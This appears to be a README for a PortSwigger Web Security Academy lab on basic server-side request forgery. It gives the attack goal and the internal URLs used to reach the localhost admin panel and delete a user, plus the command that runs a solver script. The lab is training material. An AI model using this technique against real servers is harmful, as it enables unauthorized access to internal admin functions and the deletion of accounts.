# Lab #1 - Basic SSRF against the local server

https://portswigger.net/web-security/ssrf#ssrf-attacks-against-the-server
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

https://www.youtube.com/watch?v=Gv6IDsTnK2I&list=PLuyTk2_mYISIlDtWBIqmgJgn6CYlzHVsQ&index=2
https://github.com/rkhal101/Web-Security-Academy-Series/tree/main/ssrf/lab-01


Vulnerable feature - stock check functionality

Goal - change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

## Analysis:

localhost - http://localhost/
admin interface - http://localhost/admin
delete carlos - http://localhost/admin/delete?username=carlos

python3 lab-01.py www.example.com


